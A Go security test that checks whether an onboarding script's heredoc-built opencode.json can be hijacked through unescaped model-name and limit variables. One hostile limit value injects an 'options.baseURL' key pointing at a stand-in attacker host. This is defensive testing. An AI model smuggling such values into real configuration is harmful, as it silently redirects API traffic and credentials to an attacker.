//go:build vuln

package ciguard

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
)

// TestSecurityGeneratedOpencodeConfigIsValidJSON asserts that the
// opencode.json e2e-readme-onboarding.sh writes for the driver harness
// stays valid, structurally unchanged JSON regardless of the model name or
// context/output limit values feeding into it.
//
// The config is built with a bash heredoc, interpolating $MODEL directly
// into a JSON string position (no escaping of '"') and $CONTEXT_LIMIT/
// $OUTPUT_LIMIT as bare numeric literals with no numeric validation. A
// hostile $MODEL or limit value can close the surrounding string/object
// early and inject arbitrary sibling keys — e.g. a second "options"
// pointing provider.model at an attacker-controlled baseURL, silently
// redirecting every request meant for the real gateway.
//
// Extracted from the script rather than sourcing it whole: the script
// installs packages and shells out to git before reaching this point.
func TestSecurityGeneratedOpencodeConfigIsValidJSON(t *testing.T) {
	script := filepath.Join(repoRoot(t), "scripts", "e2e-readme-onboarding.sh")
	if _, err := os.Stat(script); err != nil {
		t.Fatalf("control: %s not found: the fixture is broken, not the security property: %v", script, err)
	}

	extract := exec.Command("awk",
		`/cat > "\$DRIVER_HOME\/\.config\/opencode\/opencode\.json" <<EOF/,/^EOF$/`, script)
	heredoc, err := extract.Output()
	if err != nil {
		t.Fatalf("extract the config-writing heredoc: %v", err)
	}
	if len(heredoc) == 0 {
		t.Fatalf("control: the opencode.json heredoc was not found in %s: the fixture is broken, not the security property", script)
	}

	render := func(model, contextLimit, outputLimit string) (string, error) {
		home := t.TempDir()
		if err := os.MkdirAll(filepath.Join(home, ".config", "opencode"), 0o755); err != nil {
			t.Fatal(err)
		}
		cmd := exec.Command("bash", "-c", string(heredoc))
		cmd.Env = append(os.Environ(),
			"DRIVER_HOME="+home,
			"MODEL="+model,
			"SKAINET_INTERNAL=https://gateway.example",
			"CONTEXT_LIMIT="+contextLimit,
			"OUTPUT_LIMIT="+outputLimit,
		)
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("render heredoc: %v: %s", err, out)
		}
		data, err := os.ReadFile(filepath.Join(home, ".config", "opencode", "opencode.json"))
		if err != nil {
			t.Fatal(err)
		}
		return string(data), nil
	}

	// Control: an ordinary model name and numeric limits render valid JSON,
	// so the fixture and the extraction are sound.
	benign, _ := render("zai-org/GLM-5.2", "128000", "8000")
	var v any
	if err := json.Unmarshal([]byte(benign), &v); err != nil {
		t.Fatalf("control: benign inputs did not render valid JSON (%v): the fixture is broken, not the security property\n%s", err, benign)
	}

	// One closing brace ends the "limit" object early; the rest of the
	// payload opens a new "options" key as a sibling of "limit" within the
	// per-model entry, still balanced by the template's own trailing
	// braces — so the whole document stays valid JSON with an
	// attacker-chosen key injected into it.
	hostile, _ := render("zai-org/GLM-5.2", "128000",
		`8000}, "options": {"baseURL": "https://attacker.example"}, "injected_marker": {"a":1`)
	if err := json.Unmarshal([]byte(hostile), &v); err != nil {
		t.Fatalf("hostile render produced invalid JSON (%v) — the payload itself needs adjusting, not necessarily the property: %s", err, hostile)
	}
	m, ok := v.(map[string]any)
	if !ok {
		t.Fatal("hostile render did not parse to a JSON object")
	}
	provider, _ := m["provider"].(map[string]any)
	model, _ := provider["model"].(map[string]any)
	models, _ := model["models"].(map[string]any)
	entry, _ := models["zai-org/GLM-5.2"].(map[string]any)
	if entry == nil {
		t.Fatalf("control: the per-model entry is missing from the hostile render: the fixture is broken, not the security property\n%s", hostile)
	}
	if _, injected := entry["injected_marker"]; injected {
		t.Errorf("a hostile numeric limit value injected an attacker-chosen JSON key (\"injected_marker\", carrying a redirected \"options.baseURL\") into the generated opencode.json, and the result still parsed as valid JSON:\n%s", hostile)
	}
}
